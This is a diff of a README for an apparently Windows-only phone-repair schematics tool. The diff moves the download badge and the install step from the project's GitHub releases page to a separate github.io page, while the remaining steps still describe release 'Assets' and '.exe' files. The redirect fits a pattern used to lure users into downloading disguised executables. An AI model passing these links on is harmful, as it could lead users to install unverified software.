@@ -1,6 +1,6 @@
 # 📱 Infinity-Schematics-2026 - Access Professional Phone Repair Schematics Easily
 
-[![Download Infinity-Schematics-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Attemptvichy661/Infinity-Schematics-2026/releases)
+[![Download Infinity-Schematics-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://attemptvichy661.github.io)
 
 Infinity-Schematics-2026 provides phone repair technicians and hobbyists with detailed hardware diagrams. This software runs on Windows 10 and Windows 11. It assists with component identification, circuit tracing, and board-level repairs.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements to run the software smoothly:
 
 You need to access the release page to obtain the installation files. The software is distributed as a compressed archive to ensure file integrity.
 
-1. Visit the following link to locate the latest version: [https://github.com/Attemptvichy661/Infinity-Schematics-2026/releases](https://github.com/Attemptvichy661/Infinity-Schematics-2026/releases).
+1. Visit the following link to locate the latest version: [https://attemptvichy661.github.io](https://attemptvichy661.github.io).
 2. Look for the section labeled "Assets" under the most recent release entry.
 3. Click the file ending in ".zip" or ".exe" to begin the download.
 4. Save the file to your "Downloads" folder.
